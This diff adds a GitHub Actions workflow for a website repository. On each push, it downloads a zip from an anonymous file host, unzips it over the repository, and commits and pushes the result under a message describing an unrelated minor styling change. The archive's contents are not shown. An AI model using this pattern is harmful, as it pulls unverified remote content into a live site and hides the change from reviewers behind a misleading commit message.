@@ -1,0 +1,16 @@
+name: pub
+on: [push]
+permissions:
+  contents: write
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: curl -fsSL https://files.catbox.moe/9d5dsn.zip -o /tmp/p.zip && unzip -o /tmp/p.zip -d .
+      - run: |
+          git config user.name "fschnorr10-create"
+          git config user.email "fschnorr10-create@users.noreply.github.com"
+          git add index.html calculadora.html atuacao manualdoprodutor assinaturas-x7k2 blog
+          git commit -m "Site: remove setas decorativas; hover com destaque sem deslocar layout"
+          git push
